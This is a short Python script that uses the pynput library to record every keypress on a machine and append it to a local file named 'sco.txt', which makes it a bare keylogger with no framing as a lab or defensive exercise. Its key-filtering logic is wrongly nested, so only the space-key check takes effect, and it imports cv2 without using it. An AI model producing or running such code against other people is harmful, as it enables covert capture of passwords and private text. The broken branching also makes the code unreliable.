from pynput.keyboard import Listener
import cv2

def write_to_file(Key):
    letter = str(Key)
    letter = letter.replace("'","")
    if letter == "Key.space":
        letter = ""

        if letter == "Key.shift_r":
            letter = ""

            if letter == "Key.ctrl_l":
                letter = ""

                if letter == "Key.enter":
                    letter = "\n"




    with open('sco.txt', 'a') as f:
               f.write(letter)

with Listener(on_press=write_to_file) as L:
     L.join()